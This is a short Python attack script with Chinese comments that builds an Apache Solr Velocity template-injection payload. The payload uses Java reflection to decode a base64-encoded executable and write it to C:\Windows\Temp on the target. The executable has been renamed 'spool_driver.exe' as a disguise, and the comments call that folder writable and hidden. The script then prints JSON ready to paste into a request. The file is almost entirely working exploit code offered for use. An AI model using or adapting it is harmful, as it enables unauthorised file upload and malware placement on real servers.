import base64
import json

# ================= 配置区 =================
# 本地文件名 (就是你刚才改名的那个)
local_file = "spool_driver.exe"  
# 目标落地路径 (C:\Windows\Temp 通常有写入权限且比较隐蔽)
remote_path = r"C:\Windows\Temp\spool_driver.exe"
# =========================================

print(f"[*] 正在读取本地文件: {local_file} ...")

try:
    with open(local_file, "rb") as f:
        file_content = f.read()
    
    # 1. 转 Base64
    file_b64 = base64.b64encode(file_content).decode()
    print(f"[*] 文件大小: {len(file_content)} bytes")
    print(f"[*] Base64长度: {len(file_b64)}")

    # 2. 构造 Velocity Payload (利用 Java 原生 IO 写入，无视 CMD 限制)
    # 路径转义：把 \ 变成 \\
    escaped_path = remote_path.replace("\\", "\\\\")
    
    velocity_payload = f"""
    #set($x='')
    #set($b64='{file_b64}')
    #set($path='{escaped_path}')
    #set($String='')
    #set($Base64=$x.getClass().forName("java.util.Base64"))
    #set($decoder=$Base64.getMethod("getDecoder",null).invoke(null,null))
    #set($bytes=$decoder.decode($b64))
    #set($FileOutputStream=$x.getClass().forName("java.io.FileOutputStream"))
    #set($fos=$FileOutputStream.getConstructor($String.getClass()).newInstance($path))
    $fos.write($bytes)
    $fos.close()
    Upload_Success
    """
    
    # 3. 压缩成一行 (去除换行，防止 Solr 解析错误)
    payload_oneline = velocity_payload.replace("\n", " ").replace("    ", "")

    # 4. 生成最终 JSON
    json_payload = {
      "query": "*:*",
      "params": {
        "q": "1",
        "wt": "velocity",
        "v.template": "custom",
        "v.template.custom": payload_oneline
      }
    }

    print("\n====== 请全选复制下面的 JSON 内容 ======\n")
    print(json.dumps(json_payload))
    print("\n====== 复制结束 ======\n")

except FileNotFoundError:
    print(f"[-] 错误：找不到 {local_file}，请确认它和脚本在同一目录下。")
